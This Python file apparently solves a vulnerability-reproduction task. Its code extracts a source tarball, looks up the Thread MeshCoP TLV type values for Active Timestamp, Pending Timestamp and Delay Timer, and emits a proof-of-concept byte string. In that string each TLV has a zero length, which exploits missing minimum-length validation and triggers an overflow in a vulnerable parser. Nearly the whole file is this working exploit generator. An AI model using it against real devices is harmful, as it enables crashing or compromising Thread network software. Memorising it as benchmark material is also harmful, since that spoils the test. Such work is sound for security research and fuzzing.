import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        try:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(work_dir)
            except Exception:
                # If extraction fails for any reason, just fall back to defaults
                return self._build_default_poc()

            tlv_types = self._find_tlv_types(work_dir)
            return self._build_poc(tlv_types)
        except Exception:
            # On any unexpected error, still return a reasonable PoC
            return self._build_default_poc()

    def _find_tlv_types(self, root: str) -> dict:
        names = ["kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"]
        tlv_types = {}
        for dirpath, _, filenames in os.walk(root):
            for filename in filenames:
                if not filename.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, filename)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue

                for name in names:
                    if name in tlv_types:
                        continue
                    # Look for explicit numeric assignment, e.g. kActiveTimestamp = 9
                    m = re.search(r"\b%s\b\s*=\s*(0x[0-9a-fA-F]+|\d+)" % re.escape(name), text)
                    if m:
                        try:
                            tlv_types[name] = int(m.group(1), 0)
                        except Exception:
                            pass

                if len(tlv_types) == len(names):
                    return tlv_types

        # Fallback defaults based on Thread MeshCoP specification / OpenThread conventions
        defaults = {
            "kActiveTimestamp": 9,
            "kPendingTimestamp": 10,
            "kDelayTimer": 11,
        }
        for name in names:
            if name not in tlv_types:
                tlv_types[name] = defaults[name]
        return tlv_types

    def _build_poc(self, tlv_types: dict) -> bytes:
        # Construct a MeshCoP Dataset consisting of three TLVs:
        # Active Timestamp, Pending Timestamp, Delay Timer
        # Each TLV is given an invalid zero length to exploit the missing
        # minimum-length validation.
        data = bytearray()
        for name in ("kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"):
            t = tlv_types.get(name, 0) & 0xFF
            data.append(t)   # Type
            data.append(0)   # Length = 0 (invalid, will trigger overflow in vulnerable version)
        return bytes(data)

    def _build_default_poc(self) -> bytes:
        # Pure default based on known MeshCoP TLV type values
        # ActiveTimestamp=9, PendingTimestamp=10, DelayTimer=11
        return bytes([
            9, 0,   # Active Timestamp TLV with length 0
            10, 0,  # Pending Timestamp TLV with length 0
            11, 0,  # Delay Timer TLV with length 0
        ])
